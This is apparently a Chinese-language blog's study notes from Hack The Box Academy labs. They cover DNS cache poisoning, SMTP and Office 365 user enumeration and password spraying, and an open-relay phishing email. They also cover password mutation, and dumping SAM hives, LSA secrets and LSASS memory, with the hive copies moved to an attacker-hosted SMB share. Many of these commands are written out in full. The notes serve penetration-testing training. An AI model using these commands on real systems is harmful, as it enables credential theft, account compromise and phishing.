href="https://www.ettercap-project.org/">Ettercap</a> 或<a href="https://www.bettercap.org/">Bettercap</a>等MITM工具执行DNS缓存中毒。 要通过Ettercap利用DNS缓存中毒，我们应该首先编辑&#x2F;etc&#x2F;Ettercap&#x2F;etter.DNS文件，以映射他们想要欺骗的目标域名（例如，inlanefreight.com）和他们想要将用户重定向到的攻击者的IP地址（例如，192.168.225.110）：</p><pre><code class="shell-session">Tanin@htb[/htb]# cat /etc/ettercap/etter.dnsinlanefreight.com      A   192.168.225.110*.inlanefreight.com    A   192.168.225.110</code></pre><p>接下来，启动Ettercap工具，并通过导航到主机&gt;扫描主机来扫描网络中的活动主机。完成后，将目标IP地址（例如192.168.152.129）添加到Target1，并将默认网关IP（例如192.168.152.2）添加到Target2。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743246.png" alt="img"></p><p>通过导航到插件&gt;管理插件来激活dns_恶搞攻击。这将向目标计算机发送假DNS响应，该响应将解析inlanefreight.com到IP地址192.168.225.110：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131743982.png" alt="img"></p><p>成功的DNS欺骗攻击后，如果来自目标机器192.168.152.129的受害者用户在web浏览器上访问inlanefreight.com域，他们将被重定向到IP地址192.168.225.110上的虚假页面，此外，从目标IP地址192.168.152.129到inlanefreight.com的ping也应解析为192.168.225.110：</p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Find all available DNS records for the “inlanefreight.htb” domain on the target name server and submit the flag found as a DNS record as the answer.</p></blockquote><h1 id="Attacking-Email-Services"><a href="#Attacking-Email-Services" class="headerlink" title="Attacking Email Services"></a>Attacking Email Services</h1><p>邮件服务器（有时也称为电子邮件服务器）是一种通过网络（通常是通过互联网）处理和发送电子邮件的服务器。邮件服务器可以从客户端设备接收电子邮件并将其发送到其他邮件服务器。邮件服务器还可以向客户端设备发送电子邮件。客户端通常是我们阅读电子邮件的设备（电脑、智能手机等）。 当我们按下电子邮件应用程序（电子邮件客户端）中的“发送”按钮时，该程序将建立与网络或Internet上SMTP服务器的连接。SMTP这个名称代表简单邮件传输协议，它是一种将电子邮件从客户端传递到服务器以及从服务器传递到其他服务器的协议。 当我们将电子邮件下载到电子邮件应用程序时，它将连接到互联网上的POP3或IMAP4服务器，这允许用户将邮件保存在服务器邮箱中并定期下载。 默认情况下，POP3客户端会从电子邮件服务器中删除下载的邮件。这种行为使得在多个设备上访问电子邮件变得困难，因为下载的邮件存储在本地计算机上。但是，我们通常可以将POP3客户端配置为在服务器上保留下载邮件的副本。 另一方面，默认情况下，IMAP4客户端不会从电子邮件服务器中删除下载的邮件。此行为使从多个设备访问电子邮件变得容易。让我们看看如何针对邮件服务器。</p><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>电子邮件服务器很复杂，通常需要我们枚举多个服务器、端口和服务。此外，如今大多数公司的电子邮件服务都在云端，并提供 <a href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a>或 <a href="https://workspace.google.com/solutions/new-business/">G-Suite</a>等服务。因此，我们攻击电子邮件服务的方法取决于所使用的服务。 我们可以使用邮件交换（MX）DNS记录来识别邮件服务器。MX记录指定负责代表域名接受电子邮件的邮件服务器。可以配置几个MX记录，通常指向一个邮件服务器阵列以实现负载平衡和冗余。 我们可以使用主机或挖掘等工具以及<a href="https://mxtoolbox.com/">MXToolbox</a>等在线网站来查询有关MX记录的信息</p><h4 id="Host-MX-Records"><a href="#Host-MX-Records" class="headerlink" title="Host - MX Records"></a>Host - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX hackthebox.euhackthebox.eu mail is handled by 1 aspmx.l.google.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ host -t MX microsoft.commicrosoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.</code></pre><h4 id="DIG-MX-Records"><a href="#DIG-MX-Records" class="headerlink" title="DIG - MX Records"></a>DIG - MX Records</h4><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx plaintext.do | grep &quot;MX&quot; | grep -v &quot;;&quot;plaintext.do.           7076    IN      MX      50 mx3.zoho.com.plaintext.do.           7076    IN      MX      10 mx.zoho.com.plaintext.do.           7076    IN      MX      20 mx2.zoho.com.</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ dig mx inlanefreight.com | grep &quot;MX&quot; | grep -v &quot;;&quot;inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.</code></pre><h4 id="DIG-A-Record-for-MX"><a href="#DIG-A-Record-for-MX" class="headerlink" title="DIG - A Record for MX"></a>DIG - A Record for MX</h4><pre><code class="shell-session">Tanin@htb[/htb]$ host -t A mail1.inlanefreight.htb.mail1.inlanefreight.htb has address 10.129.14.128</code></pre><p>这些MX记录表明，前三个邮件服务使用的是云服务G-Suite（aspmx.l.google.com）、Microsoft 365（Microsoft.com.mail.protection.outlook.com）和Zoho（MX.Zoho.com），最后一个可能是该公司托管的自定义邮件服务器。 此信息至关重要，因为枚举方法可能因服务而异。例如，大多数云服务提供商使用他们的邮件服务器实现，并采用现代身份验证，这为每个服务提供商打开了新的、唯一的攻击向量。另一方面，如果公司配置服务，我们可能会发现允许对邮件服务器协议进行常见攻击的不良做法和错误配置。 如果我们的目标是一个自定义邮件服务器实现，如inlanefreight.htb，我们可以列举以下端口：</p><table><thead><tr><th><code>TCP/25</code></th><th>SMTP Unencrypted</th></tr></thead><tbody><tr><td><code>TCP/143</code></td><td>IMAP4 Unencrypted</td></tr><tr><td><code>TCP/110</code></td><td>POP3 Unencrypted</td></tr><tr><td><code>TCP/465</code></td><td>SMTP Encrypted</td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 Encrypted</td></tr><tr><td><code>TCP/995</code></td><td>POP3 Encrypted</td></tr></tbody></table><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128</code></pre><h2 id="Misconfigurations"><a href="#Misconfigurations" class="headerlink" title="Misconfigurations"></a>Misconfigurations</h2><p>电子邮件服务使用身份验证来允许用户发送电子邮件和接收电子邮件。当SMTP服务允许匿名身份验证或支持可用于枚举有效用户名的协议时，可能会发生配置错误。</p><h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><p>SMTP服务器有不同的命令，可用于枚举有效用户名VRFY、EXPN和RCPT to。如果我们成功枚举有效用户名，我们可以尝试密码喷洒、暴力破解或猜测有效密码。因此，让我们探究一下这些命令是如何工作的。</p><h4 id="VRFY-Command"><a href="#VRFY-Command" class="headerlink" title="VRFY Command"></a>VRFY Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)VRFY root252 2.0.0 rootVRFY www-data252 2.0.0 www-dataVRFY new-user550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table</code></pre><p>EXPN与VRFY类似，只是当与通讯组列表一起使用时，它会列出该列表中的所有用户。这可能是一个比VRFY命令更大的问题，因为站点通常有一个别名，如“all”</p><h4 id="EXPN-Command"><a href="#EXPN-Command" class="headerlink" title="EXPN Command"></a>EXPN Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)EXPN john250 2.1.0 john@inlanefreight.htbEXPN support-team250 2.0.0 carol@inlanefreight.htb250 2.1.5 elisa@inlanefreight.htb</code></pre><p>RCPT TO标识电子邮件的收件人。对于给定的邮件，可以多次重复此命令，以便将单个邮件传递给多个收件人。</p><h4 id="RCPT-TO-Command"><a href="#RCPT-TO-Command" class="headerlink" title="RCPT TO Command"></a>RCPT TO Command</h4><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 25Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.220 parrot ESMTP Postfix (Debian/GNU)MAIL FROM:test@htb.comit is250 2.1.0 test@htb.com... Sender okRCPT TO:julio550 5.1.1 julio... User unknownRCPT TO:kate550 5.1.1 kate... User unknownRCPT TO:john250 2.1.5 john... Recipient ok</code></pre><p>我们还可以根据服务实现使用POP3协议来枚举用户。例如，我们可以使用USER命令和用户名，如果服务器的响应为OK，这意味着用户存在于服务器上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ telnet 10.10.110.20 110Trying 10.10.110.20...Connected to 10.10.110.20.Escape character is &#39;^]&#39;.+OK POP3 Server readyUSER julio-ERRUSER john+OK</code></pre><p>为了自动化我们的枚举过程，我们可以使用一个名为 <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>的工具。我们可以用后面跟着VRFY、EXPN或RCPT的参数-M指定枚举模式，用包含要枚举的用户列表的文件指定参数-U。根据服务器实现和枚举模式，我们需要添加带有参数-D的电子邮件地址的域。最后，我们用参数-t指定目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></pre><h2 id="Cloud-Enumeration"><a href="#Cloud-Enumeration" class="headerlink" title="Cloud Enumeration"></a>Cloud Enumeration</h2><p>如前所述，云服务提供商使用自己的电子邮件服务实现。这些服务通常具有自定义功能，我们可以滥用这些功能进行操作，例如用户名枚举。让我们以Office365为例，探讨如何在此云平台中枚举用户名。 <a href="https://github.com/0xZDH/o365spray">O365spray</a>是<a href="https://twitter.com/0xzdh">ZDH</a>开发的一款针对Microsoft Office 365（O365）的用户名枚举和密码喷涂工具。该工具重新实现了鸣谢中<a href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>提到的人员研究和确定的列举和喷涂技术的集合。让我们首先验证我们的目标域是否正在使用Office 365。</p><h4 id="O365-Spray"><a href="#O365-Spray" class="headerlink" title="O365 Spray"></a>O365 Spray</h4><pre><code class="shell-session">python3 o365spray.py --validate --domain msplaintext.xyz</code></pre><p>validate:验证</p><p>现在，我们可以尝试识别用户名。</p><pre><code class="shell-session"> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   </code></pre><h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><p>我们可以使用Hydra对SMTP、POP3或IMAP4等电子邮件服务执行密码喷洒或暴力攻击。首先，我们需要获得用户名列表和密码列表，并指定要攻击的服务。让我们看看POP3的示例。</p><pre><code class="shell-session">hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></pre><p>如果云服务支持SMTP、POP3或IMAP4协议，我们可能可以尝试使用Hydra等工具执行密码喷洒，但这些工具通常会被阻止。相反，我们可以尝试使用自定义工具，如适用于Microsoft Office 365的 <a href="https://github.com/0xZDH/o365spray">o365spray</a>或<a href="https://github.com/dafthack/MailSniper">MailSniper</a>，或适用于Gmail或Okta的 <a href="https://github.com/ustayready/CredKing">CredKing</a>。请记住，这些工具需要是最新的，因为如果服务提供商更改某些内容（这种情况经常发生），这些工具可能就无法再工作了。这是一个完美的例子，说明了为什么我们必须了解我们的工具在做什么，并拥有在它们因某种原因无法正常工作时对其进行修改的专业知识。</p><h4 id="O365-Spray-Password-Spraying"><a href="#O365-Spray-Password-Spraying" class="headerlink" title="O365 Spray - Password Spraying"></a>O365 Spray - Password Spraying</h4><pre><code class="shell-session"> python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></pre><h2 id="Protocol-Specifics-Attacks"><a href="#Protocol-Specifics-Attacks" class="headerlink" title="Protocol Specifics Attacks"></a>Protocol Specifics Attacks</h2><p>开放中继是简单传输邮件协议（SMTP）服务器，该服务器配置不正确，允许未经身份验证的电子邮件中继。意外或有意配置为开放中继的消息服务器允许来自任何来源的邮件通过开放中继服务器透明地重新路由。这种行为屏蔽了消息的来源，使其看起来像是来自开放中继服务器的邮件。</p><h4 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h4><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</code></pre><p>接下来，我们可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p><pre><code class="shell-session">Tanin@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Company Notification&#39; --body &#39;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#39; --server 10.10.11.213</code></pre><pre><code class="shell-session">=== Trying 10.10.11.213:25...=== Connected to 10.10.11.213.&lt;-  220 mail.localdomain SMTP Mailer ready -&gt; EHLO parrot&lt;-  250-mail.localdomain&lt;-  250-SIZE 33554432&lt;-  250-8BITMIME&lt;-  250-STARTTLS&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1&lt;-  250 HELP -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;&lt;-  250 OK -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;&lt;-  250 OK -&gt; DATA&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400 -&gt; To: employees@inlanefreight.com -&gt; From: notifications@inlanefreight.com -&gt; Subject: Company Notification -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt; -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -&gt;  -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/ -&gt;  -&gt;  -&gt; .&lt;-  250 OK -&gt; QUIT&lt;-  221 Bye=== Connection closed with remote host.</code></pre><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>这里先用检测一下是否使用o365服务（后来仔细看发先这是检测云服务的，应该没有必要）：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201558544.png" alt="image-20230820155755455"></p><p>看来没有启用，使用常规方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201604202.png" alt="image-20230820160410150"></p><p>这里域名-D看样子是值邮件的后缀</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201614934.png" alt="image-20230820161403882"></p><p>用户名是带域名的，然后登录不知道怎么办，无论如何不给过</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201653370.png" alt="image-20230820165359316"></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Passwrod_Attack</title>
      <link href="/2023/07/20/Passwrod-Attack/"/>
      <url>/2023/07/20/Passwrod-Attack/</url>
      
        <content type="html"><![CDATA[<p>在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户</p><span id="more"></span><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这里引入了一个新工具攻击各种基于windows的协议：</p><pre><code class="shell-session">Tanin@htb[/htb]$  crackmapexec -hoptional arguments:  -h, --help            show this help message and exit  -t THREADS            set how many concurrent threads to use (default: 100)  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)  --jitter INTERVAL     sets a random delay between each connection (default: None)  --darrell             give Darrell a hand  --verbose             enable verbose outputprotocols:  available protocols  &#123;mssql,smb,ssh,winrm&#125;    mssql               own stuff using MSSQL    smb                 own stuff using SMB    ssh                 own stuff using SSH    winrm               own stuff using WINRM</code></pre><p>针对某种协议的用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb -h</code></pre><p>通用的语法大致如下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;</code></pre><h4 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h4><p>这里还提到了一个专门针对WinRM的工具 <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo gem install evil-winrm</code></pre><p>基本用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ evil-winrm -i &lt;target-IP&gt; -u &lt;username&gt; -p &lt;password&gt;</code></pre><p>直接上练习：</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:10.129.202.136</p><ul><li>查找WinRM服务的用户并破解其密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到SSH服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到RDP服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>查找SMB服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li></ul></blockquote><p>这里纯属爆破比较无聊，而且vpn比较慢，直接学下一节吧。</p><h1 id="Password-Mutations"><a href="#Password-Mutations" class="headerlink" title="Password Mutations"></a>Password Mutations</h1><p>他给了一篇博客，是关于密码的<a href="https://wpengine.com/resources/passwords-unmasked-infographic/">WPengine</a></p><p>顺带再放一个hashcat的规则集方便查找：<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">documentation</a></p><h4 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a><a href="https://github.com/digininja/CeWL">CeWL</a></h4><p>我们现在可以使用另一个名为CeWL的工具来扫描公司网站上的潜在单词，并将其保存在单独的列表中。然后，我们可以将该列表与所需规则相结合，创建一个自定义的密码列表，该列表猜测正确密码的概率更高。我们指定了一些参数，如spider的深度（-d）、单词的最小长度（-m）、找到的单词的小写存储（–lower），以及我们想要存储结果的文件（-w）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用本节右上角“资源”下ZIP文件中的文件创建一个变异单词列表。使用此单词列表可以强制爆破用户“sam”的密码。成功后，使用SSH登录并提交flag.txt文件的内容作为您的答案。</p></blockquote><p>这里它给了一个文件里面有一个密码本和用户列表和一个规则集，上一题应该用这个文档能轻松爆破。。。</p><p>这里要做什么也很清楚，但是发现hydra不能直接使用-r了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201825210.png" alt="image-20230720182512124"></p><p>这里先用hashcat转换一下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</code></pre><blockquote><ol><li><code>hashcat</code>: 运行 Hashcat 密码破解工具。</li><li><code>--force</code>: 强制进行破解，即忽略一些警告信息。</li><li><code>password.list</code>: 这是包含要破解的密码列表的文件名，Hashcat 将从该文件中读取密码列表进行破解。</li><li><code>-r custom.rule</code>: 使用规则文件 <code>custom.rule</code> 对密码进行变换。规则文件定义了一系列的字符串转换规则，Hashcat 将应用这些规则来生成多个变换后的密码，并将其用于破解尝试。</li><li><code>--stdout</code>: 将生成的所有变换后的密码输出到标准输出（即屏幕），而不是进行实际的破解尝试。</li><li><code>|</code>: 管道符号，将前面命令的输出作为后面命令的输入。</li><li><code>sort -u</code>: 对密码进行排序并去除重复的密码。</li><li><code>&gt; mut_password.list</code>: 将排序后去重的密码列表输出到名为 <code>mut_password.list</code> 的文件中。</li></ol></blockquote><p>然后：</p><pre><code>hydra -l sam -P mut_password.list  ssh://10.129.202.64</code></pre><p>&#x3D;&#x3D;&gt;</p><h1 id="Password-Reuse-x2F-Default-Passwords"><a href="#Password-Reuse-x2F-Default-Passwords" class="headerlink" title="Password Reuse &#x2F; Default Passwords"></a>Password Reuse &#x2F; Default Passwords</h1><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>他给出了一个默认凭据表： <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds-Cheat-Sheet</a></p><p>有时候由于接口服务等过多管理员选择复制粘贴默认密码而不是手动输入一个自定义密码</p><p>也可以直接搜索有无默认凭据：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201836635.png" alt="img"></p><h1 id="Windows-Local-Password-Attacks"><a href="#Windows-Local-Password-Attacks" class="headerlink" title="Windows Local Password Attacks"></a>Windows Local Password Attacks</h1><h2 id="Attacking-SAM"><a href="#Attacking-SAM" class="headerlink" title="Attacking SAM"></a>Attacking SAM</h2><h4 id="Copying-SAM-Registry-Hives"><a href="#Copying-SAM-Registry-Hives" class="headerlink" title="Copying SAM Registry Hives"></a>Copying SAM Registry Hives</h4><p>如果我们在目标上有本地管理员访问权限，我们可以复制三个注册表配置单元；当我们开始倾倒和破解散列时，每一个都有特定的目的。以下是下表中每一项的简要说明：</p><table><thead><tr><th>Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>包含与本地帐户密码关联的哈希。我们需要散列，这样我们就可以破解它们，并以明文形式获得用户帐户密码。</td></tr><tr><td><code>hklm\system</code></td><td>包含用于加密SAM数据库的系统引导密钥。我们将需要引导密钥来解密SAM数据库。</td></tr><tr><td><code>hklm\security</code></td><td>包含域帐户的缓存凭据。我们可能会从加入域的Windows目标中受益。</td></tr></tbody></table><h4 id="Using-reg-exe-save-to-Copy-Registry-Hives"><a href="#Using-reg-exe-save-to-Copy-Registry-Hives" class="headerlink" title="Using reg.exe save to Copy Registry Hives"></a>Using reg.exe save to Copy Registry Hives</h4><p>以管理员身份启动CMD将允许我们运行reg.exe来保存上述注册表配置单元的副本。请运行以下命令执行此操作：</p><pre><code class="cmd-session">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.saveThe operation completed successfully.</code></pre><p>要创建共享，我们所要做的就是使用python运行smbserver.py-smb2support，给共享一个名称（CompData），并指定攻击主机上共享将存储配置单元副本的目录（&#x2F;home&#x2F;ltnob&#x2F;Documents）。要知道smb2support选项将确保支持较新版本的SMB。如果我们不使用此标志，从Windows目标连接到我们的攻击主机上托管的共享时将出现错误。较新版本的Windows默认不支持SMBv1，因为存在大量严重漏洞和公开漏洞。</p><p>一旦共享在我们的攻击主机上运行，我们就可以在Windows目标上使用move命令将配置单元副本移动到共享。</p><h4 id="Moving-Hive-Copies-to-Share"><a href="#Moving-Hive-Copies-to-Share" class="headerlink" title="Moving Hive Copies to Share"></a>Moving Hive Copies to Share</h4><pre><code class="cmd-session">C:\&gt; move sam.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move security.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move system.save \\10.10.15.16\CompData        1 file(s) moved.</code></pre><h2 id="Dumping-Hashes-with-Impacket’s-secretsdump-py"><a href="#Dumping-Hashes-with-Impacket’s-secretsdump-py" class="headerlink" title="Dumping Hashes with Impacket’s secretsdump.py"></a>Dumping Hashes with Impacket’s secretsdump.py</h2><p>使用secretsdump.py是一个简单的过程。我们所要做的就是使用Python运行secretsdump.py，然后指定从目标主机检索到的每个配置单元文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre><h2 id="Remote-Dumping-amp-LSA-Secrets-Considerations"><a href="#Remote-Dumping-amp-LSA-Secrets-Considerations" class="headerlink" title="Remote Dumping &amp; LSA Secrets Considerations"></a>Remote Dumping &amp; LSA Secrets Considerations</h2><p>通过使用本地管理员权限访问凭据，我们也可以通过网络锁定LSA机密。这可以允许我们从正在运行的服务、计划任务或使用LSA机密存储密码的应用程序中提取凭据。</p><h4 id="Dumping-LSA-Secrets-Remotely"><a href="#Dumping-LSA-Secrets-Remotely" class="headerlink" title="Dumping LSA Secrets Remotely"></a>Dumping LSA Secrets Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsaSMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)SMB         10.129.42.198   445    WS01     [+] Dumping LSA secretsSMB         10.129.42.198   445    WS01     WS01\worker:Hello123SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdcedpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944aSMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488bSMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached</code></pre><h4 id="Dumping-SAM-Remotely"><a href="#Dumping-SAM-Remotely" class="headerlink" title="Dumping SAM Remotely"></a>Dumping SAM Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>应用本节中教授的概念，获取目标上ITbackdoor用户帐户的密码。提交明文密码作为答案。</p><p>在目标上转储LSA机密并发现存储的凭据。提交用户名和密码作为答案。（格式：用户名：密码，区分大小写）</p></blockquote><h1 id="Attacking-LSASS"><a href="#Attacking-LSASS" class="headerlink" title="Attacking LSASS"></a>Attacking LSASS</h1><p>除了获得SAM数据库的副本以转储和破解哈希之外，我们还将受益于针对LSASS。如本模块的凭据存储部分所述，LSASS是一项关键服务，在所有Windows操作系统中的凭据管理和身份验证过程中发挥着核心作用。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201915415.png" alt="lsass Diagram"></p><p>初次登录后，LSASS将： 在内存中本地缓存凭据 创建访问令牌 强制执行安全策略 写入Windows安全日志 让我们介绍一些可以用来转储LSASS内存和从运行Windows的目标中提取凭据的技术和工具。</p><h2 id="Dumping-LSASS-Process-Memory"><a href="#Dumping-LSASS-Process-Memory" class="headerlink" title="Dumping LSASS Process Memory"></a>Dumping LSASS Process Memory</h2><p>与使用LSASS攻击SAM数据库的过程类似，我们最好首先通过生成内存转储来创建LSASS进程内存内容的副本。通过创建转储文件，我们可以使用攻击主机离线提取凭据。请记住，离线进行攻击使我们在攻击速度上具有更大的灵活性，并且在目标系统上花费的时间更少。我们可以使用无数种方法来创建内存转储。让我们介绍一下可以使用Windows内置工具执行的技术。</p><h4 id="Task-Manager-Method"><a href="#Task-Manager-Method" class="headerlink" title="Task Manager Method"></a>Task Manager Method</h4><p>通过访问与目标的交互式图形会话，我们可以使用任务管理器创建内存转储。这就要求我们：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201916966.png" alt="Task Manager Memory Dump"></p><p>打开任务管理器&gt;选择进程选项卡&gt;查找并右键单击本地安全机构进程&gt;选择创建转储文件</p><p>一个名为lsass.DMP的文件被创建并保存在：</p><pre><code class="cmd-session">C:\Users\loggedonusersdirectory\AppData\Local\Temp</code></pre><h4 id="Rundll32-exe-amp-Comsvcs-dll-Method"><a href="#Rundll32-exe-amp-Comsvcs-dll-Method" class="headerlink" title="Rundll32.exe &amp; Comsvcs.dll Method"></a>Rundll32.exe &amp; Comsvcs.dll Method</h4><p>任务管理器方法依赖于我们与目标进行基于GUI的交互式会话。我们可以使用另一种方法，通过名为 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>的命令行实用程序转储LSASS进程内存。这种方法比任务管理器方法更快，也更灵活，因为我们可能只需访问命令行就可以在Windows主机上获得shell会话。需要注意的是，现代反病毒工具将这种方法识别为恶意活动。 在发出创建转储文件的命令之前，我们必须确定为lsass.exe分配了哪个进程ID（PID）。这可以通过cmd或PowerShell完成：</p><h4 id="Finding-LSASS-PID-in-cmd"><a href="#Finding-LSASS-PID-in-cmd" class="headerlink" title="Finding LSASS PID in cmd"></a>Finding LSASS PID in cmd</h4><pre><code class="cmd-session">C:\Windows\system32&gt; tasklist /svcImage Name                     PID Services========================= ======== ============================================System Idle Process              0 N/ASystem                           4 N/ARegistry                        96 N/Asmss.exe                       344 N/Acsrss.exe                      432 N/Awininit.exe                    508 N/Acsrss.exe                      520 N/Awinlogon.exe                   580 N/Aservices.exe                   652 N/Alsass.exe                      672 KeyIso, SamSs, VaultSvc</code></pre><pre><code class="powershell-session">PS C:\Windows\system32&gt; Get-Process lsassHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------   1260      21     4948      15396       2.56    672   0 lsass</code></pre><h4 